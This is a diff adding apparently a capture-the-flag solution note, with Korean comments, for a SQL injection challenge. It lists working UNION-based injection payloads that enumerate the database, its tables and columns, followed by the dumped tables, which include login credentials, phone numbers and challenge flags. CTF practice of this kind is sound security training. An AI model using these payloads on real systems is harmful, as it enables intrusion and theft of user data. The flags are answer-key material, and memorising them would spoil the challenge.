@@ -1,0 +1,32 @@
+over%' and '1%' = '1
+over%' union select 1,2,3,4 # -> 1은 히든 쿼리
+over%' union select 1,2,3,database() # -> database명 segfaualt_sql
+over%' union select 1,2,3,table_name from information_schema.tables where table_schema = 'segfault_sql' #
+-> 테이블명 game, member, secret, secret_member
+
+over%' union select 1,2,3,column_name from information_schema.columns where table_name = 'game' #
+over%' union select 1, idx, name, score from game#
+
+
+<game>
+idx 	name 							score 			production
+1	Overwatch							91				Blizzard
+2	SHERLOCK HOLMES: THE AWAKENED		77				Frogwares
+3	SID MEIER'S CIVILIZATION VI				88				Firaxis Games
+
+<member>
+user_id	user_pass	name  user_level	info		id		pass		email
+							dol		doldol	aaaa		mario@test.com
+							FA		fake		qqqq		fake@test.com
+							admin	nor		1234		normaltic@test.com	
+							???		test		test1234	test@test.com
+							
+<secret>
+idx			secret
+1			segfault{wow...youDid?}
+
+<secret_member>
+name   		phone			email				level
+normaltic		010-3333-2222		normal@test.com		50
+doldol		010-4444-2222		dol@dol.com		97
+xMan			010-2930-5738		xMan@secret.com	segfault{You Found It!?}
